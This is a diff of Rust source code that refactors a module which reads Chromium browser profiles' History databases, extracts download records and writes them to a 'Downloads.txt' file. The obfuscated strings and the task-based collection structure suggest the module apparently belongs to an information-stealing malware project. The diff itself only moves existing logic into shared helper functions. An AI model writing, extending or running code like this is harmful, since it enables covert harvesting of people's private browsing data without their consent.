@@ -7,7 +7,7 @@ use alloc::vec::Vec;
 use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
 use crate::chromium::Browser;
-use crate::Download;
+use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Download};
 use obfstr::obfstr as s;
 use sqlite::{read_sqlite3_database_by_bytes, TableRecord, TableRecordExtension};
 
@@ -28,43 +28,19 @@ impl Task for DownloadsTask {
     parent_name!("Downloads.txt");
     
     unsafe fn run(&self, parent: &Path) {
-        let mut downloads: Vec<Download> = self.browser
-            .profiles
-            .iter()
-            .filter_map(|profile| get_downloads(profile))
-            .flat_map(|v| v.into_iter())
-            .collect();
-
-        if downloads.is_empty() {
+        let Some(mut downloads) = collect_from_all_profiles(&self.browser.profiles, get_downloads) else {
             return
-        }
-
-        downloads.sort();
-        downloads.dedup();
+        };
 
         downloads.truncate(500);
 
-        let _ = downloads
-            .iter()
-            .map(|download| download.to_string())
-            .collect::<Vec<String>>()
-            .join("\n\n")
-            .write_to(parent);
+        let _ = to_string_and_write_all(&downloads, "\n\n", parent);
     }
 }
 
 fn get_downloads(profile: &Path) -> Option<Vec<Download>> {
     let history_path = profile / s!("History");
-    let bytes = history_path.read_file().ok()?;
-
-    let db = read_sqlite3_database_by_bytes(&bytes)?;
-    let table = db.read_table(s!("Downloads"))?;
-
-    let downloads = table
-        .filter_map(|record| extract_download_from_record(&record))
-        .collect();
-
-    Some(downloads)
+    read_sqlite3_and_map_records(&history_path, s!("Downloads"), extract_download_from_record)
 }
 
 fn extract_download_from_record(record: &Box<dyn TableRecord>) -> Option<Download> {
